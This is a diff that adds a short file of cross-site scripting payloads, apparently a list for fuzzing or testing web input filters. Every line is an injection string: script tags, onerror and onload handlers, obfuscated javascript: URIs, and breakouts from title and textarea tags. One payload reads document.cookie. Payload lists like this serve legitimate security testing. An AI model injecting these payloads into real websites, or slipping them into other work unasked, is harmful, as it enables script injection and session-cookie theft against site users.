@@ -1,0 +1,14 @@
+<script>alert(1);</script>
+<script>alert('XSS');</script>
+<img src=foo.png onerror=alert(/xssed/) />
+<marquee><script>alert('XSS')</script></marquee>
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
+</title><script>alert(/xss/)</script>
+</textarea><script>alert(/xss/)</script>
+<img src=javascript:alert('XSS')>
+<svg/onload=alert%26%23x00000000028;%27xss%27%26%23x00000000029;>
+'/></a></><img src=1.gif onerror=alert(1)>
+<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
+'>><marquee><h1>XSS</h1></marquee>
+''></title><script>alert(1111)</script>
+</textarea>''><script>alert(document.cookie)</script>
